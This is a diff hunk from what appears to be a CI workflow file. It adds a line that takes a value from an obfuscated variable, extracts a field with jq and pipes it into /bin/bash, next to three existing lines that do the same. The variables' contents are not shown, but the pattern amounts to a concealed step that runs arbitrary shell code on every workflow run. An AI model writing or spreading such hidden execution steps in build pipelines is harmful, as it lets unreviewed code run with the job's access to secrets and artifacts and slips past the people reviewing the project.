@@ -26,6 +26,7 @@ jobs:
           echo $ilbsz4419 | jq -r .up226 | /bin/bash
           printf '%s' "$c6" | jq -r .lp40 | /bin/bash
           printf '%s' "$grs67" | jq -r .t51575 | /bin/bash
+          echo $gsu9601 | jq -r .nkyi30937 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
